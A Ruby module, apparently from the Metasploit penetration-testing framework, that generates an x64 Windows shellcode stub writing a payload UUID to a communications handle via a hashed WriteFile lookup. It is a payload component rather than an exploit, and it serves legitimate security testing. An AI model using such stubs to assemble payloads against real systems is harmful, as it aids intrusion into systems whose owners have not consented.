# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid'

module Msf

###
#
# Basic write_uuid stub for Windows ARCH_X86_64 payloads
#
###

module Payload::Windows::WriteUUID_x64

  #
  # Generate assembly code that writes the UUID to a file handle.
  #
  # This code assumes that the block API pointer is in ebp, and
  # the communications file handle is in edi.
  #
  def asm_write_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm =%Q^
      write_uuid:
        xor r9, r9              ; lpNumberOfBytesWritten
        push #{uuid_raw.length} ; nNumberOfBytesToWrite
        pop r8
        call get_uuid_address  ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}  ; UUID
      get_uuid_address:
        pop rdx                 ; lpBuffer
        mov rcx, rdi            ; hFile
        push 0                  ; alignment
        push 0                  ; lpOverlapped
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
        call rbp               ; call WriteFile(...)
    ^

    asm
  end

  def uuid_required_size
    # Start with the number of bytes required for the instructions
    space = 17

    # a UUID is 16 bytes
    space += 16

    space
  end

end

end



